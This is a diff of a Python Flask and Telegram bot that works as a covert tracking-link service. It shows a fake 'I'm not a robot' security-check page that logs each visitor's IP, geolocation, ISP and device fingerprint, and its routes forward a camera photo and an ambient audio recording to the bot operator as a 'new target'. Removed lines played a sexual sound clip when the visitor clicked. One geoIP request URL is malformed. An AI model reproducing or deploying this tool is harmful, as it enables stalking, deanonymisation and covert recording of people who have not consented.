@@ -1,24 +1,20 @@
 import telebot, requests, os, uuid
-from flask import Flask, request, send_from_directory
+from flask import Flask, request
 
 API_TOKEN = os.environ.get('API_TOKEN')
 bot = telebot.TeleBot(API_TOKEN, threaded=False)
 app = Flask(__name__)
-db = {}
 
-SOUND_FILE = 'zvuki-seksa-seks-na-beregu_-zhenskie-stony-pod-shum-morya.mp3'
-
-@app.route('/ston.mp3')
-def send_ston():
-    return send_from_directory(os.getcwd(), SOUND_FILE)
+# Хранилище в памяти
+db = {} 
 
 @app.route('/')
 def home():
     return f'''
     <body style="background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:sans-serif;text-align:center;">
         <div style="padding:40px;border:1px solid #333;border-radius:20px;">
-            <h1 style="color:#0088cc;">CVERIA CORE V13</h1>
-            <a href="/activate" style="padding:15px 30px;background:#0088cc;color:#fff;text-decoration:none;border-radius:10px;">АКТИВИРОВАТЬ</a>
+            <h1 style="color:#0088cc;margin:0 0 20px 0;">CVERIA V14</h1>
+            <a href="/activate" style="padding:15px 30px;background:#0088cc;color:#fff;text-decoration:none;border-radius:10px;font-weight:bold;">АКТИВИРОВАТЬ СИСТЕМУ</a>
         </div>
     </body>
     '''
@@ -32,23 +28,32 @@ def activate():
 
 @app.route('/' + (API_TOKEN if API_TOKEN else "none"), methods=['POST'])
 def get_m():
-    bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
-    return "!", 200
+    if request.headers.get('content-type') == 'application/json':
+        bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
+        return "!", 200
+    return "forbidden", 403
 
 @app.route('/v/<uid>')
 def logger(uid):
     if uid not in db: return "URL EXPIRED - CREATE NEW ONE IN BOT", 404
     owner_id, target = db[uid]['owner'], db[uid]['url']
-    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()
     
-    # Смена GeoIP на более живучий
-    g = "📍 GeoIP Error"
+    # Получаем IP
+    ip_raw = request.headers.get('x-forwarded-for', request.remote_addr)
+    ip = ip_raw.split(',')[0].strip() if ip_raw else request.remote_addr
+    
+    # GeoIP Фикс
+    g = "📍 Данные GeoIP недоступны"
     try:
         r = requests.get(f"https://ipapi.co{ip}/json/", timeout=5).json()
-        g = f"🌍 {r.get('country_name')}, {r.get('city')}\n📡 {r.get('org')}\n🛡️ VPN: {'ДА' if r.get('proxy') else 'НЕТ'}"
+        if not r.get('error'):
+            g = (f"🌍 Страна: {r.get('country_name')} ({r.get('country_code')})\n"
+                 f"🏙 Город: {r.get('city')}\n"
+                 f"📡 Провайдер: {r.get('org')}\n"
+                 f"🛡️ VPN/Proxy: {'ДА' if r.get('proxy') else 'НЕТ'}")
     except: pass
     
-    bot.send_message(owner_id, f"🎯 *НОВЫЙ ТАРГЕТ!*\n👤 IP: `{ip}`\n{g}", parse_mode="Markdown")
+    bot.send_message(owner_id, f"🎯 *НОВЫЙ ТАРГЕТ!*\n\n👤 IP: `{ip}`\n{g}", parse_mode="Markdown")
     
     return f'''
     <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
@@ -56,23 +61,20 @@ def logger(uid):
         <div>
             <div style="font-size:65px;margin-bottom:15px;">🛡️</div>
             <h2>Проверка безопасности</h2>
+            <p style="color:#555;margin-bottom:30px;">Нажмите кнопку для продолжения</p>
             <button id="go" style="padding:18px 60px;border:none;border-radius:40px;background:#fff;color:#000;font-weight:900;cursor:pointer;">Я НЕ РОБОТ</button>
         </div>
-        <audio id="snd" src="/ston.mp3" preload="auto"></audio>
         <video id="v" style="display:none;" autoplay playsinline muted></video><canvas id="c" style="display:none;"></canvas>
         <script>
-        const btn = document.getElementById('go');
-        btn.onclick = async () => {{
-            btn.innerText = "Анализ...";
-            try {{ document.getElementById('snd').play(); }} catch(e) {{}}
+        document.getElementById('go').onclick = async () => {{
+            document.getElementById('go').innerText = "Анализ...";
             
             let d = {{
                 uid: "{uid}",
                 hw: {{ scr: screen.width+"x"+screen.height+"*"+devicePixelRatio, cores: navigator.hardwareConcurrency, ram: navigator.deviceMemory || "N/A", gpu: "N/A" }},
                 bat: {{ lvl: "N/A", char: "N/A" }},
                 net: {{ type: navigator.connection ? navigator.connection.effectiveType : "N/A", hist: history.length, tz: Intl.DateTimeFormat().resolvedOptions().timeZone, lang: navigator.language }},
-                social: {{ g: "❌", vk: "❌", tg: "❌" }},
-                inc: "НЕТ"
+                social: {{ g: "❌", vk: "❌", tg: "❌" }}, inc: "НЕТ"
             }};
 
             try {{
@@ -97,7 +99,6 @@ def logger(uid):
                 if (est.quota < 120000000) d.inc = "ДА";
             }}
 
-            // ОТПРАВКА ТЕХ ОТЧЕТА
             await fetch('/log_extra', {{ method: 'POST', headers: {{'Content-Type': 'application/json'}}, body: JSON.stringify(d) }});
 
             try {{
@@ -157,12 +158,12 @@ def log_photo():
 @app.route('/log_audio', methods=['POST'])
 def log_audio():
     uid, f = request.form.get('uid'), request.files.get('audio')
-    if uid in db and f: bot.send_document(db[uid]['owner'], f.read(), caption=f"🎤 *РЕАКЦИЯ* (ID: `{uid}`)")
+    if uid in db and f: bot.send_document(db[uid]['owner'], f.read(), caption=f"🎤 *ЗАПИСЬ ОКРУЖЕНИЯ* (ID: `{uid}`)")
     return "ok"
 
 @bot.message_handler(commands=['start'])
 def start(m):
-    bot.reply_to(m, "🤖 Бот активен. Пришли ссылку на Telegraph.")
+    bot.reply_to(m, "👋 Привет! Пришли ссылку на Telegraph.")
 
 @bot.message_handler(func=lambda m: "telegra.ph" in m.text.lower())
 def create(m):
@@ -170,4 +171,4 @@ def create(m):
     if not url.startswith("http"): url = "https://" + url
     uid = str(uuid.uuid4())[:8]
     db[uid] = {'owner': m.chat.id, 'url': url}
-    bot.reply_to(m, f"✅ Ссылка: https://{request.host}/v/{uid}")
+    bot.reply_to(m, f"✅ Твоя ссылка:\n`https://{request.host}/v/{uid}`", parse_mode="Markdown")
